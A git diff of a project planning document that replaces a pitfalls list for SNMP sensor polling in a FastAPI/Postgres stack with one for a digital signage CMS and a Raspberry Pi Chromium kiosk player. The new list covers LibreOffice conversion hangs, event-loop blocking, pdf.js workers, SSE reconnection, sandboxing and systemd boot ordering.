@@ -1,552 +1,635 @@
-# Domain Pitfalls: v1.15 Sensor Monitor Integration
+# Pitfalls Research — v1.16 Digital Signage
 
-**Domain:** SNMP polling + time-series persistence + APScheduler integration inside an existing FastAPI + Postgres + React + Directus stack
-**Researched:** 2026-04-17
-**Reference implementation reviewed:** `/Users/johannbechtold/Documents/snmp-monitor/app.py` (standalone FastAPI + SQLite + YAML + APScheduler)
-**Existing codebase reviewed:** `backend/app/scheduler.py` (Personio APScheduler pattern), `docker-compose.yml` (4-container bridge network), `backend/app/services/hr_sync.py` (existing async-sync pattern)
+**Domain:** Digital signage CMS + Chromium-kiosk player added to existing FastAPI + Directus + React monorepo
+**Researched:** 2026-04-18
+**Confidence:** HIGH (existing stack invariants from v1.11/v1.15 are documented; external integration risks verified against Chromium/LibreOffice/pdf.js upstream issues through 2025)
 
-**Scope:** pitfalls specific to ADDING these features to the running v1.14 stack — not generic SNMP advice.
+Scope note: STACK.md covers versions, FEATURES.md covers feature taxonomy, ARCHITECTURE.md covers integration points. This file is **pure pitfalls + prevention + phase owner**.
+
+Phase owners referenced:
+- **Schema Phase** — Alembic-managed `media/playlists/playlist_items/devices/device_tags` tables
+- **Backend Phase** — `/api/signage/*` routes, SSE, pairing, heartbeat
+- **Conversion Phase** — PPTX → image pipeline (LibreOffice headless + pdf2image)
+- **Admin UI Phase** — Signage surfaces under `/signage` (AdminOnly)
+- **Player Phase** — Chromium-kiosk web page, format handlers, offline cache
+- **Pi Provisioning Phase** — systemd unit, Chromium flags, kiosk boot
+- **Docs Phase** — bilingual admin guide articles, operator runbook
 
 ---
 
 ## Critical Pitfalls
 
-### C-1: New `SnmpEngine()` per poll call (reference impl has this bug)
+### Pitfall 1: LibreOffice headless hangs the conversion worker indefinitely
 
-**What goes wrong:** `backend/app/services/snmp_client.py` (port from `app.py:172`) calls `SnmpEngine()` inside `snmp_get()` — a new engine object every poll, per sensor, per OID. On 5 sensors × 2 OIDs × 60-second interval, that's 14,400 engine instantiations per day per pod.
+**What goes wrong:** A corrupt or password-protected `.pptx` makes `soffice --headless --convert-to pdf` block on a dialog that never renders; the worker occupies APScheduler's single process slot forever, and subsequent uploads queue behind it. With `--workers 1` invariant (v1.15 lesson), this kills the whole API's background processing.
 
-**Why it happens:** copy-pasted from the standalone reference, where the bug is harmless because the app serves one user. Inside the shared `api` container it competes with Personio sync + KPI aggregation on the same event loop.
+**Why it happens:** LibreOffice in headless mode still tries to open interactive prompts (password, repair, macro warnings) on malformed files. There is no upstream timeout; the process only dies if killed.
 
-**Consequences:**
-- ~1 MB / 6 s RAM leak when SNMP requests time out (documented pysnmp issue — timeout path doesn't free UDP transport state cleanly in versions < 7.1.22)
-- Initialization overhead (`__manageColumns`, MIB symbol export) on every call
-- UDP source-port churn — every engine opens a new ephemeral socket, which makes firewall debugging harder
+**How to avoid:**
+- Run conversion **outside** the APScheduler event loop via `asyncio.create_subprocess_exec("soffice", "--headless", "--convert-to", "pdf", ...)` with `asyncio.wait_for(proc.communicate(), timeout=60.0)`.
+- On `TimeoutError` call `proc.kill()` then `await proc.wait()` (do not leave zombies).
+- Wrap in `try/except` and mark the media row `conversion_status='failed'` with a diagnostic string.
+- Use a **dedicated temp directory per conversion** (`tempfile.mkdtemp()`), clean up in `finally`. LibreOffice leaves lockfiles in `$HOME/.config/libreoffice` that deadlock concurrent instances — set `-env:UserInstallation=file:///tmp/lo_<uuid>` per invocation.
 
-**Prevention:**
-- Instantiate **one** `SnmpEngine` in the app startup path (`scheduler.py` lifespan) and stash it on `app.state.snmp_engine`.
-- Polling coroutine receives the engine as a parameter; never calls `SnmpEngine()` directly.
-- Pin `pysnmp >= 7.1.23` (the version that fixed the dispatcher resource leak).
-- Add a test: `poll_all()` runs 1000 iterations against a mock transport; `tracemalloc` diff < 5 MB.
+**Warning signs:** Background-job log entries show conversion start with no finish event; `ps aux | grep soffice` shows multiple live processes; media rows stuck in `conversion_status='pending'`.
 
-**Detection:** `docker stats kpi-dashboard-api-1` RSS creeping up over 24 hours; compare v1.14 baseline RSS to v1.15.
-
-**Phase mapping:** **Phase 38 (SNMP client service) MUST include the shared-engine pattern and pin pysnmp version.**
-
-**Confidence:** HIGH (pysnmp 7.1 changelog + multiple GitHub issues + direct code inspection of reference impl).
+**Phase to address:** Conversion Phase. Verification: upload a known-corrupt PPTX in acceptance testing and confirm it is marked `failed` within 60 seconds without blocking a second upload.
 
 ---
 
-### C-2: Blocking sync `sqlite3` calls copied into the async `api` container
+### Pitfall 2: subprocess.run() blocks the FastAPI event loop
 
-**What goes wrong:** The reference impl uses `sqlite3.connect(DB_PATH)` with a synchronous `with` block inside async functions (`app.py:147-152`). Naïvely lifting this into the `api` container — even if the SQL target is rewritten to Postgres — risks another copy-paste trap: calling a sync `psycopg2`/`psycopg.Connection` from inside an `async def` coroutine, blocking the event loop.
+**What goes wrong:** Developer writes `subprocess.run(["soffice", ...], timeout=60)` inside an async route handler or an async APScheduler job. The call blocks the single-threaded event loop; SSE connections stall, heartbeats from all 5 devices go silent, health checks flap.
 
-**Why it happens:** the reference is not async-aware. A hurried port may leave `sqlite3` calls replaced with `psycopg2`, which is also sync. Meanwhile the rest of the backend uses `AsyncSession` / asyncpg.
+**Why it happens:** `subprocess.run` is synchronous. Under `--workers 1`, any sync blocking call freezes every other concurrent request.
 
-**Consequences:** every poll cycle blocks the event loop for 50–500 ms per insert. During the block, `/api/sales/*`, `/api/hr/*`, and Directus-JWT validation all stall. Under load, uvicorn starts dropping requests.
+**How to avoid:** Use `asyncio.subprocess.create_subprocess_exec` (or `create_subprocess_shell` — but prefer the former for argv safety). Never call the sync `subprocess` module from async code. If you must (legacy lib), offload to `anyio.to_thread.run_sync(...)` or `loop.run_in_executor(None, ...)`.
 
-**Prevention:**
-- All sensor DB access goes through the **existing** `AsyncSessionLocal` from `app.database`. Follow the pattern in `backend/app/services/hr_sync.py` — open a session per poll cycle, not per insert.
-- **Never import `sqlite3` or `psycopg2` anywhere in `backend/app/`.** Add a grep check to CI: `! grep -rnE "import (sqlite3|psycopg2)" backend/app/`.
-- Add one integration test that runs `asyncio.gather(poll_all(), fetch_summary_endpoint())` concurrently and asserts both complete within 2× their individual baselines (= no blocking).
+**Warning signs:** During a PPTX upload, `/api/health` latency spikes to >30s; SSE clients emit `onerror` and reconnect simultaneously; APScheduler misfire warnings.
 
-**Detection:** `uvicorn --log-level debug` — look for >200 ms gaps between accepted-request and response-sent logs during poll cycles.
-
-**Phase mapping:** **Phase 38 (SNMP + DB) MUST use AsyncSessionLocal and pass the CI grep check.**
-
-**Confidence:** HIGH (direct code inspection + existing project convention).
+**Phase to address:** Conversion Phase + Backend Phase (code review checklist). Verification: grep `backend/` for `subprocess\.run\|subprocess\.Popen\|subprocess\.call` — zero hits outside dev scripts.
 
 ---
 
-### C-3: Community string leaked in logs and stored in plaintext
+### Pitfall 3: Concurrent PPTX conversions exhaust RAM
 
-**What goes wrong:** The reference impl logs SNMP errors with the host but has no explicit redaction of the community string — and happily accepts it in `/api/config` request bodies and logs it via Pydantic's default `__repr__` on validation errors. `config.yaml` stores community strings as plaintext. When ported, the same pattern would put plaintext community strings in the Postgres `sensors` table.
+**What goes wrong:** Admin uploads 5 PPTX files in quick succession. Each LibreOffice instance claims ~400–800 MB RAM; the API container OOM-kills itself (default Docker memlimit or host limit). Directus, API, and all SSE clients drop simultaneously.
 
-**Why it happens:** community strings are "just a string" in SNMP v2c. Developers treat them as configuration, not as credentials. In reality a v2c community gives read access to temperature, humidity, uptime, interface stats, and often interface descriptions — it is a secret.
+**Why it happens:** LibreOffice is not lightweight; `pdf2image`/poppler on top adds another 100–200 MB per file. No built-in concurrency cap.
 
-**Consequences:**
-- Community strings end up in `docker logs api` (accessible to anyone who can shell into the host)
-- Directus `/items/sensors` exposes them to any authenticated user (Directus doesn't know the field is sensitive) — but we plan to exclude the `sensors` table from Directus via `DB_EXCLUDE_TABLES`, which mitigates this specific exposure.
-- A routine `pg_dump` backup (nightly backup sidecar, `.planning/PROJECT.md`) propagates them into on-disk backups with world-readable defaults.
+**How to avoid:**
+- Enforce **serial conversions** via an `asyncio.Semaphore(1)` (or `Semaphore(2)` if the host has >4 GB spare). A queue of 5 files converting serially is fine for a small-fleet CMS.
+- Set explicit `mem_limit` on the `api` service in `docker-compose.yml` so OOMs are local and recoverable rather than crashing the host.
+- Reject uploads over a size cap (e.g. 50 MB) at the FastAPI boundary before LibreOffice touches the file.
 
-**Prevention:**
-- Encrypt `sensors.community` at rest with the same **Fernet key already used for Personio credentials** (`.planning/PROJECT.md` references this in v1.3). Reuse the encryption helpers — do not introduce a second crypto layer.
-- Add `community` to the Pydantic schema as `SecretStr`; FastAPI will redact it in error responses.
-- Use a structured-logger formatter that strips the `community` key from log records (wrap `log.warning(...)` with a helper that takes the sensor object and logs only `sensor.name` + `sensor.host`).
-- Add the `sensors` table name to the `DB_EXCLUDE_TABLES` env var in `docker-compose.yml` (alongside existing Alembic-managed tables) — belt-and-suspenders even though the table will be admin-only anyway.
-- Add the sensors backup volume path to the documented 0600-permissions expectation in `docs/admin-guide/system-setup.{en,de}.md`.
+**Warning signs:** `docker stats api` spikes near memlimit; `dmesg | grep -i oom` on the host; uploads fail mid-batch with 502.
 
-**Detection:** `grep -i "community" backups/*.sql | grep -v "^--"` should return zero non-comment matches (ciphertext only).
-
-**Phase mapping:** **Phase 39 (sensor config schema + Alembic migration) MUST encrypt community at rest and SecretStr at the API boundary; admin-guide update in Phase 43.**
-
-**Confidence:** HIGH (direct code inspection of reference impl + project's existing Fernet pattern).
+**Phase to address:** Conversion Phase. Verification: upload 5 PPTX files concurrently; observe serial processing in logs and peak RAM < 1.5 GB.
 
 ---
 
-### C-4: APScheduler job re-entry when a poll cycle exceeds the interval
+### Pitfall 4: Font rendering differs between dev laptop and Docker container
 
-**What goes wrong:** The reference impl registers `scheduler.add_job(poll_all, "interval", seconds=60)` without `max_instances` or `coalesce`. If 5 sensors × 3 s timeout × 1 retry = up to 30 s of sequential waits (or longer with `asyncio.gather` but still bounded by the slowest sensor), a slow/offline host during a poll will cause the next 60-second tick to fire — but the previous run may still be in-flight. By default APScheduler allows the second run to start, and two poll cycles race on the same DB session / same UDP source ports.
+**What goes wrong:** A PPTX with Calibri/Arial/custom fonts renders correctly on the admin's laptop but becomes Liberation Sans / boxes in the container-converted output. Customers see "broken" slides.
 
-**Why it happens:** APScheduler's defaults are permissive: `max_instances=1` is the documented default, but `coalesce=False`. Worse, the reference impl doesn't set `max_instances` explicitly — it relies on the default. When copy-pasted into an unfamiliar codebase, someone may bump `max_instances=3` "to be safe" and hit the re-entry bug.
+**Why it happens:** The `libreoffice` apt package in slim base images ships minimal font coverage. Microsoft fonts are not redistributable; DejaVu/Liberation are substituted automatically.
 
-**Consequences:**
-- Duplicate rows for the same `(sensor_id, poll_tick)` if the unique constraint isn't in place (see C-5)
-- Inconsistent "last seen" values in the UI
-- If polling ever hits a deadlock on the UDP side (host stopped responding mid-query), the scheduler's ThreadPoolExecutor fills up
+**How to avoid:**
+- In the `api` (or dedicated `converter`) Dockerfile, install `fonts-liberation fonts-dejavu fonts-noto-core ttf-mscorefonts-installer` (the last requires accepting the EULA at build time via `ACCEPT_EULA`).
+- Document in the admin guide: "Embed fonts in PPTX (File → Options → Save → Embed fonts)" as the supported authoring workflow. This is the only 100% deterministic fix.
+- Add a visual regression gate: convert a known-good test PPTX in CI and diff against a baseline PNG.
 
-**Prevention:**
-- **Always** pass `max_instances=1, coalesce=True, misfire_grace_time=30` on the sensor poll job. Match the existing Personio pattern in `backend/app/scheduler.py:52` which already uses `max_instances=1`.
-- Poll cycle itself must bound its own runtime: `asyncio.wait_for(poll_all(), timeout=min(45, interval - 5))`. Aborting a poll is better than overlapping with the next.
-- On every poll, log `scheduler.get_job(JOB_ID).next_run_time` after completion — if consistently > 2 intervals away, the job is chronically late and interval should be widened.
+**Warning signs:** Admin reports "fonts look wrong on the screen"; comparing uploaded vs. rendered slides shows different typefaces.
 
-**Detection:** Log a warning when a poll cycle takes > 80% of the configured interval.
-
-**Phase mapping:** **Phase 40 (APScheduler integration) MUST mirror the existing Personio job settings exactly: `max_instances=1, coalesce=True, replace_existing=True`, plus add `misfire_grace_time=30` and an outer `asyncio.wait_for` timeout.**
-
-**Confidence:** HIGH (APScheduler docs + existing code pattern in `backend/app/scheduler.py`).
+**Phase to address:** Conversion Phase (Dockerfile) + Docs Phase (embed-fonts guidance).
 
 ---
 
-### C-5: Unique constraint missing on `(sensor_id, recorded_at)` — duplicate rows on manual + auto poll collision
+### Pitfall 5: pdf.js worker bundle missing under Vite
 
-**What goes wrong:** Two code paths can write a reading for the same sensor at the same instant: (a) the scheduled poll, (b) a user clicking "Poll now" in the UI. The reference impl uses `int(time.time())` resolution (whole seconds) and has no unique constraint, so two writes < 1 s apart produce two rows for the same second. Under the ported schema with `timestamp with time zone`, we get microsecond resolution, so exact collisions become rare — but a "Poll now" click followed by the scheduled poll firing within the same second is still common.
+**What goes wrong:** Player loads a PDF; browser console shows `Setting up fake worker failed` or `pdf.worker.mjs 404`. pdf.js falls back to running in the main thread — blocks animation, first render takes 20+ seconds on large PDFs, memory doubles.
 
-**Why it happens:** Reference impl treats `readings` as append-only with no dedup. When manual-poll was added late in development, no one revisited the insertion logic.
+**Why it happens:** Vite does not auto-bundle pdf.js's worker. You must explicitly import the worker URL with Vite's `?url` suffix and pass it to `GlobalWorkerOptions.workerSrc`.
 
-**Consequences:**
-- Chart shows two dots at the same timestamp, one possibly `NULL` for humidity (see C-11)
-- KPI aggregation double-counts if we add any summary endpoint
-- Import from old SQLite history (C-9) can clash with fresh polls if imported timestamps overlap
+**How to avoid:**
+```ts
+import * as pdfjs from "pdfjs-dist";
+import pdfjsWorker from "pdfjs-dist/build/pdf.worker.min.mjs?url";
+pdfjs.GlobalWorkerOptions.workerSrc = pdfjsWorker;
+```
+Use the **exact same version** of `pdfjs-dist` for the worker and the main module (version mismatch throws `UnknownErrorException: The API version does not match the Worker version`).
 
-**Prevention:**
-- Alembic migration creates `UNIQUE INDEX readings_sensor_recorded_at_uq ON sensor_readings(sensor_id, recorded_at)`.
-- Insert code uses `INSERT ... ON CONFLICT (sensor_id, recorded_at) DO NOTHING` (SQLAlchemy: `postgresql.insert(...).on_conflict_do_nothing()`).
-- "Poll now" handler does not write if the most recent row for that sensor is < 2 s old; it just returns the existing latest row.
+**Warning signs:** Console error on first PDF load; PDF render > 5s; `pdf.worker` not visible in the Network tab.
 
-**Detection:** test — schedule poll, manually trigger poll 500 ms later, assert exactly one row inserted.
-
-**Phase mapping:** **Phase 39 (schema) MUST include the unique index and ON CONFLICT pattern.**
-
-**Confidence:** HIGH (direct inspection of reference impl insert path + SQL standard).
+**Phase to address:** Player Phase (format handlers). Verification: open DevTools on the Pi in pairing/dev mode; confirm worker loaded and request succeeds.
 
 ---
 
-### C-6: Docker bridge network cannot reach 192.9.201.x from `api` container by default
+### Pitfall 6: Large PDFs exhaust browser memory on Pi 4
 
-**What goes wrong:** The existing `docker-compose.yml` (lines 22–39) puts `api` on Docker's default bridge network. Containers on the default bridge can reach the host's LAN via the host's routing table by default on Linux — but this is only true when:
-1. The host has a working route to 192.9.201.0/24, **and**
-2. `sysctl net.ipv4.ip_forward = 1` on the host, **and**
-3. The Docker bridge's iptables MASQUERADE rule is intact (the default), **and**
-4. No firewall drops UDP 161 outbound from the bridge subnet, **and**
-5. No Docker Desktop VM boundary is in the way (macOS / Windows)
+**What goes wrong:** A 200-page PDF loaded via pdf.js allocates one canvas per rendered page. On a Pi 4 (1–4 GB RAM, shared with GPU), Chromium tab crashes with "Aw, Snap!" and the playlist loop halts at that media item.
 
-On the operator's Mac (where the stack gets developed), **none of this works by default** because Docker Desktop's VM does not have the host's 192.9.201.x route. `host.docker.internal` only resolves the host — not other LAN hosts.
+**Why it happens:** pdf.js renders pages to canvases by default. With page-flip, the previous and next pages are pre-rendered — that's 3 canvases × page size × 4 bytes/pixel.
 
-**Why it happens:** developers test locally with Docker Desktop, assume it'll work on Linux too, and learn at production deploy that SNMP times out from inside the container.
+**How to avoid:**
+- Enforce a **page-count ceiling** at upload (e.g. `<= 50 pages`). Reject or truncate larger PDFs with a user-visible error.
+- Render **one page at a time**, destroy the previous canvas before rendering the next: `page.cleanup()` and set canvas width/height to 0 before dropping the ref.
+- Cap render dimensions to the display resolution (no point rendering at 300 dpi for a 1920×1080 screen).
+- **Fallback strategy:** if PDF has > N pages, server-side convert to a sequence of images (same pipeline as PPTX via LibreOffice PDF→PNG) and play as an image slideshow instead of pdf.js page-flip.
 
-**Consequences:** every `snmp_get()` returns `None`, charts are empty, operators assume the sensor is offline, milestone perceived-broken on day one.
+**Warning signs:** Chromium tab memory > 1.5 GB in `chrome://memory-internals`; page-flip stutters; Pi swapfile thrashing.
 
-**Prevention:**
-- Add a verification section to Phase 38 plan: from inside the running `api` container, `snmpget -v2c -c public 192.9.201.10 1.3.6.1.2.1.1.1.0` must succeed before any application code ships. Install `snmp` in the backend Dockerfile's dev layer (or a documented `docker compose exec api apk add net-snmp-tools` line in verification steps).
-- Document the fallback: if bridge mode fails on the deployment host, the `api` service can be switched to `network_mode: "host"` in a compose override file. Flag the tradeoff — loses container port isolation, binds 8000 directly to host.
-- For macOS dev machines: document that SNMP testing must happen on the Linux production host (or via a cheap `snmpsim` mock container the dev can run locally). Do not block development on operator-network reachability.
-- Do not use `network_mode: host` in the committed `docker-compose.yml` — that would break the other three services' port mappings.
-
-**Detection:** Phase 38 verification checklist item: `docker compose exec api snmpget ...` produces a value. Screenshot of successful snmpget goes in `38-VERIFICATION.md`.
-
-**Phase mapping:** **Phase 38 (SNMP client service) MUST include the in-container `snmpget` smoke test as a gating verification step before any business logic is written. Phase 43 (admin guide) MUST document the host-mode fallback.**
-
-**Confidence:** HIGH (Docker networking docs + direct analysis of existing `docker-compose.yml`).
+**Phase to address:** Player Phase + Conversion Phase (image-fallback pipeline) + Admin UI Phase (page-count validation on upload).
 
 ---
 
-### C-7: AsyncIOScheduler + uvicorn `--workers > 1` fires every job N times
+### Pitfall 7: Chromium EventSource does not reliably reconnect after Pi sleeps or network drops
 
-**What goes wrong:** The existing `api` command in `docker-compose.yml:24` is `uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload`. Today there's only one worker (default), so the Personio sync job runs once every hour. If anyone ever adds `--workers 4` for scaling, the sensor poll fires 4×/minute — 4 SNMP GETs against every host, 4 DB inserts per cycle, 4× unique-constraint contention.
+**What goes wrong:** Pi loses Wi-Fi for 10 minutes; comes back; Chromium's built-in `EventSource.readyState` reports `OPEN` but no new events arrive. Admin pushes a playlist change; nothing happens. Only a full page reload recovers.
 
-**Why it happens:** default APScheduler in-memory job store has no cross-process coordination. Each worker process is a separate Python interpreter; each runs its own scheduler.
+**Why it happens:** Chromium's EventSource reconnect logic honors the server's `retry:` field and can get stuck in a zombie-open state after TCP keepalive failures — especially through reverse proxies that silently drop idle connections.
 
-**Consequences:**
-- Quadruple SNMP load on the physical sensors (rate-limit or trigger agent-side misbehavior)
-- ON CONFLICT traffic on every insert
-- Unpredictable interval — races between workers mean actual cadence is closer to `interval / N`
+**How to avoid:**
+- Send heartbeat comments from the server every 15 s (`yield ": keepalive\n\n"`) via `sse-starlette`'s `ping` param — this keeps the connection warm through nginx's default 60s `proxy_read_timeout`.
+- In the player, run a **watchdog**: track last-received-event timestamp; if > 45 s without anything (including keepalive pings), `eventSource.close()` then create a new one.
+- Layer a **polling fallback** at 30 s regardless of SSE state — if SSE is healthy, it just confirms state; if SSE is zombie, polling catches the change (hybrid is an explicit project feature).
+- Server: configure `nginx` (or Directus's proxy) with `proxy_read_timeout 3600s; proxy_buffering off; chunked_transfer_encoding on;` on the `/api/signage/stream` location.
 
-**Prevention:**
-- Keep `--workers 1` on the `api` service. Document this constraint with a comment in `docker-compose.yml` referencing both the Personio job (existing) and the sensor poll job (new):
-  ```yaml
-  # DO NOT set --workers > 1. APScheduler runs in-process with an in-memory job
-  # store; multiple workers would run each job N times. Scale via replicas only
-  # if a shared job store (Redis) is introduced first.
-  ```
-- If horizontal scaling is ever needed, the remediation path is: extract the scheduler into a separate `scheduler` service container (like the existing `migrate` service pattern), and let the `api` service stay stateless with `--workers N`.
+**Warning signs:** Admin-pushed changes take > 60 s to appear on a device; device `last_seen` heartbeat is current but `current_playlist_version` is stale.
 
-**Detection:** health-check assertion — `GET /api/sensors/_diag/scheduler` (admin-only) returns the job list; the count of "sensor_poll" jobs is exactly 1.
-
-**Phase mapping:** **Phase 40 (APScheduler integration) MUST add a `--workers 1` comment in compose and the admin-only diag endpoint.**
-
-**Confidence:** HIGH (APScheduler docs, FAQ explicit on this, multiple GitHub issues).
+**Phase to address:** Backend Phase (SSE implementation) + Player Phase (watchdog) + Pi Provisioning Phase (nginx config if custom proxy).
 
 ---
 
-### C-8: Event-loop blocked by `time.sleep` or sync iterator in walk/discover flows
+### Pitfall 8: SSE connections block the single-worker event loop if implemented sync
 
-**What goes wrong:** The reference impl's `snmp_walk` uses `async for ... in nextCmd(...)` correctly (`app.py:210`). **But** if the walk is ported and the developer adds a "rate limit" with `time.sleep(0.1)` between results, or replaces `async for` with a sync `for` because "it looked cleaner," the coroutine blocks the entire event loop for the duration of the walk.
+**What goes wrong:** Developer writes an SSE generator that does `time.sleep(30)` or issues sync DB calls between yields. With `--workers 1` (v1.15 invariant), each connected player occupies a slot; 5 Pis = the API is 100% blocked; Directus admin UI stops responding because FastAPI proxies or shares the loop.
 
-**Why it happens:** `async for` with large walk results can look janky in logs, tempting developers to "pace" it. Also, pysnmp's sync API still exists in other modules (`pysnmp.hlapi.v1arch.asyncio` vs `pysnmp.hlapi.v3arch.asyncio`) — mixing them silently falls back to blocking.
+**Why it happens:** SSE generators are long-lived; any sync blocking call inside one multiplies the damage.
 
-**Consequences:** A user clicking "Walk OIDs" in the admin UI freezes every other request for the duration of the walk (up to `max_results * (timeout + retries)` = minutes in worst case).
+**How to avoid:**
+- Use `sse-starlette`'s `EventSourceResponse` with an **async generator**. Between events, `await asyncio.sleep(...)`, never `time.sleep`.
+- DB access inside the generator must use `AsyncSession` (project already enforces this).
+- Drive change notifications via an `asyncio.Queue` per connection (or a single `asyncio.Event`/`Condition` broadcast). Do not poll the DB inside the generator at short intervals — that's what the 30-s polling fallback is for.
+- Cap concurrent connections with an `asyncio.Semaphore` acquired in the route handler; exceeding → HTTP 503 with `Retry-After`. Small-fleet scope (≤5 devices) means cap at ~10 is plenty.
 
-**Prevention:**
-- All timing in poll/walk paths: **only `asyncio.sleep`, never `time.sleep`**. Add a grep check to CI: `! grep -rn "time.sleep" backend/app/services/snmp*`.
-- Import path is locked: `from pysnmp.hlapi.v3arch.asyncio import ...` — document this in the service module docstring. The older `pysnmp.hlapi.asyncio` path used by the reference impl (`app.py:28-37`) still works but is the deprecated v1arch path in pysnmp 7.x.
-- Cap walk results at `max_results=200` server-side (reference impl does this — keep it). Also cap walk wall-clock time with `asyncio.wait_for(snmp_walk(...), timeout=30)`.
+**Warning signs:** `/api/health` p95 latency climbs with each connected device; graceful shutdown (`docker compose down`) hangs > 30 s.
 
-**Detection:** load test — fire a walk and 20 concurrent `/api/sensors` GETs; 95th percentile latency of the GETs must stay < 500 ms.
-
-**Phase mapping:** **Phase 38 (SNMP client) MUST use v3arch.asyncio import and wrap walk in asyncio.wait_for.**
-
-**Confidence:** HIGH (pysnmp 7.1 docs + direct inspection).
+**Phase to address:** Backend Phase. Verification: connect 5 EventSource clients and confirm `/api/health` stays < 100 ms.
 
 ---
 
-## Moderate Pitfalls
+### Pitfall 9: Chromium `--no-sandbox` default is a real attack surface
 
-### M-1: Directus admin gate bypassed by the sensors static assets or WebSocket
+**What goes wrong:** Pi provisioning scripts copy-paste `chromium-browser --kiosk --no-sandbox http://api/signage/player` from a tutorial. `--no-sandbox` disables the renderer sandbox; a malicious iframe (signage feature allows URL embeds) can escape to the host.
 
-**What goes wrong:** The v1.11 auth pattern gates FastAPI mutation routes on `role == 'Admin'`. If the sensors milestone adds (a) a WebSocket endpoint for live updates, (b) an `unauthenticated` endpoint for a shared "public dashboard" display, or (c) serves sensor chart data via a differently-mounted router — any one of these can slip past the existing gate.
+**Why it happens:** Running Chromium as root on a Pi fails without `--no-sandbox`; tutorials universally add it rather than fixing the root cause.
 
-**Why it happens:** the admin-gate dependency (`Depends(require_admin)`) has to be added to every new route. Missing it is a silent failure.
+**How to avoid:**
+- Create a dedicated `signage` user on the Pi (`useradd -m signage`), run Chromium under that user via systemd `User=signage`. Then **do not** pass `--no-sandbox`.
+- Sandbox is then automatically functional under non-root.
+- If `--no-sandbox` is truly required (edge case), combine with `--site-per-process` and a strict `Content-Security-Policy` on the player page (`frame-src 'self' https://trusted-embeds.example.com`).
 
-**Consequences:** a Viewer account reads temperature/humidity data they shouldn't see; worse, the walk endpoint (which can discover arbitrary OIDs including interface descriptions, SNMP community enumeration) becomes accessible.
+**Warning signs:** Player process running as `root` in `ps`; Chromium logs `Running as root without --no-sandbox is not supported`.
 
-**Prevention:**
-- Every new sensor route registers with `dependencies=[Depends(require_admin)]` at the **router** level, not per-endpoint. Example in `backend/app/routers/sensors.py`:
-  ```python
-  router = APIRouter(
-      prefix="/api/sensors",
-      tags=["sensors"],
-      dependencies=[Depends(require_admin)],
-  )
-  ```
-- Add a test that enumerates `app.routes` and asserts every route under `/api/sensors/*` has `require_admin` in its dependency chain. This catches routers added later that forget the gate.
-- Do NOT add a WebSocket endpoint in this milestone. Frontend polling via TanStack Query is sufficient (see M-5). WebSocket auth with Directus JWT has its own set of gotchas (query-param tokens, refresh mid-session) — out of scope for v1.15.
-- If the "public dashboard" anti-pattern comes up, redirect the discussion to a dedicated public-read role in Directus later; do not bolt on anonymous endpoints.
-
-**Phase mapping:** **Phase 41 (API routes) MUST apply `require_admin` at router level and include the dependency-audit test. Phase 42 verification has a click-path confirming Viewer login cannot see the sensor tile in the App Launcher.**
-
-**Confidence:** HIGH (FastAPI router pattern + existing project convention).
+**Phase to address:** Pi Provisioning Phase + Docs Phase (image-bake checklist).
 
 ---
 
-### M-2: Interval drift when config changes mid-cycle (reference impl has this bug)
+### Pitfall 10: Chromium boots before X/Wayland is ready → black screen
 
-**What goes wrong:** Reference impl `app.py:415-421` calls `scheduler.reschedule_job` inside the PUT /api/config handler, but does not interrupt an in-flight poll. If the user changes the interval from 60 s to 300 s while a poll is running, the next poll fires at `now + 300s`, not `poll_start + 300s` — causing a visible gap.
+**What goes wrong:** systemd starts `chromium-kiosk.service` on boot. It fires before the graphical session is up; Chromium exits immediately; systemd disables it after 5 restart attempts. Pi boots to black screen forever.
 
-**Why it happens:** `reschedule_job` sets the next run time based on the new trigger from the current moment. APScheduler has no "restart the interval relative to the in-flight job" option.
+**Why it happens:** Missing `After=graphical.target` / `Wants=graphical-session.target` and no `ExecStartPre` gate for DISPLAY availability.
 
-**Consequences:** minor UX glitch — chart gaps after an interval change. Not a correctness issue, but confusing.
+**How to avoid:**
+```ini
+[Unit]
+Description=Signage Kiosk
+After=graphical.target network-online.target
+Wants=graphical-session.target network-online.target
 
-**Prevention:**
-- In the PUT /api/sensor-settings handler (Phase 41), after `reschedule_job`, log the old interval, new interval, and computed next_run_time so operators can reason about gaps.
-- Document in admin-guide article: "interval changes take effect immediately but may cause a one-cycle gap." Same pattern as Personio's D-06.
-- If interval change frequency is low (expected: once per month by an admin), the gap is acceptable.
+[Service]
+User=signage
+Environment=DISPLAY=:0
+Environment=XAUTHORITY=/home/signage/.Xauthority
+ExecStartPre=/bin/sh -c 'until xset -q; do sleep 1; done'
+ExecStart=/usr/bin/chromium-browser --kiosk ...
+Restart=on-failure
+RestartSec=5
 
-**Phase mapping:** **Phase 41 (admin config API) — log the transition, document in admin guide.**
+[Install]
+WantedBy=graphical.target
+```
+On Wayland/`labwc` on Raspberry Pi OS Bookworm, use the user systemd session (`systemctl --user`) under the auto-logged-in user and target `graphical-session.target`.
 
-**Confidence:** HIGH (APScheduler docs + direct code inspection).
+**Warning signs:** `systemctl status chromium-kiosk` shows rapid-restart cycle; `journalctl` logs `cannot open display :0`.
 
----
-
-### M-3: `asyncio.gather` of all sensors with `return_exceptions=False` — one failure cancels others
-
-**What goes wrong:** Reference impl uses `asyncio.gather(*(poll_sensor(s) for s in cfg.sensors))` at `app.py:252` with default arguments. If one sensor raises an unexpected exception (not the `try/except` inside `snmp_get` — a programming error like `AttributeError`), the default `return_exceptions=False` propagates and cancels all sibling poll tasks.
-
-**Why it happens:** Most of the time, sensor errors are caught inside `snmp_get` and return `None`. But an unanticipated exception (bad OID string, pysnmp internal error) escapes.
-
-**Consequences:** one misconfigured sensor taking down the polling of all other sensors, silently, until the next scheduler tick.
-
-**Prevention:**
-- Use `asyncio.gather(*tasks, return_exceptions=True)` and iterate results logging exceptions per sensor.
-- Better: wrap each `poll_sensor` call in its own `try/except Exception` with per-sensor logging, so the error attribution is unambiguous.
-- Include sensor name/id in every log message from the poll path (structured log fields, not string concatenation).
-
-**Phase mapping:** **Phase 38 (poll orchestration) MUST wrap each sensor in its own exception boundary; gather uses `return_exceptions=True`.**
-
-**Confidence:** HIGH (asyncio docs + direct inspection).
+**Phase to address:** Pi Provisioning Phase + Docs Phase.
 
 ---
 
-### M-4: Sensor offline fills DB with NULL rows
+### Pitfall 11: Chromium kiosk flag set is incomplete → autoplay fails, cursor visible, tab dies silently
 
